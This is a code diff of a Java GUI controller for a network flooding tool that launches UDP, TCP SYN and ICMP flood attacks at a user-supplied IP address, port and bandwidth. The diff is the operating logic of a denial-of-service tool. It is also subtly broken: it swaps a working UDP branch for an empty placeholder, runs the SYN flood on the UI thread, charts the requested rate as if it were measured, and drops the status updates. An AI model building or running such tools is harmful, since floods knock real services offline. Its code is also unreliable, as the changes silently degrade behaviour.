@@ -102,27 +102,30 @@ public class MainController {
         String attackType = attackTypeComboBox.getValue();
         String targetIp = ipAddressField.getText();
         int targetPort = Integer.parseInt(portField.getText());
-        int targetMbps = Integer.parseInt(targetMbpsField.getText());
+        long targetBytesPerSecond = Long.parseLong(targetMbpsField.getText()) * 125000L; // Convert Mbps to bytes/sec
 
         // Reset chart data
         dataSeries.getData().clear();
         startTime = System.currentTimeMillis();
 
-        if ("UDP Flood".equals(attackType)) {
-            log("Starting UDP flood attack...");
-            new Thread(() -> {
-                jenkinsTool.udpFlood(targetIp, targetPort, targetMbps, this::updateChart);
-            }).start();
-        } else if ("TCP SYN Flood".equals(attackType)) {
-            log("Starting TCP SYN flood attack...");
-            new Thread(() -> {
-                jenkinsTool.tcpSynFlood(targetIp, targetPort, targetMbps, this::updateChart);
-            }).start();
+        switch (attackType) {
+            case "UDP Flood":
+                // Existing UDP flood implementation
+                break;
+            case "TCP SYN Flood":
+                jenkinsTool.tcpSynFlood(targetIp, targetPort, targetBytesPerSecond, () -> {
+                    long currentTime = System.currentTimeMillis();
+                    double elapsedTimeSeconds = (currentTime - startTime) / 1000.0;
+                    double actualMbps = targetBytesPerSecond * 8.0 / 1_000_000.0; // Convert bytes/sec to Mbps
+                    updateChart(elapsedTimeSeconds, actualMbps);
+                });
+                break;
+            case "ICMP Flood":
+                // Existing ICMP flood implementation
+                break;
+            default:
+                log("Unknown attack type selected.");
         }
-        
-        statusLabel.setText("Status: Attack Running");
-        startButton.setDisable(true);
-        stopButton.setDisable(false);
     }
 
     public void stopAttack() {
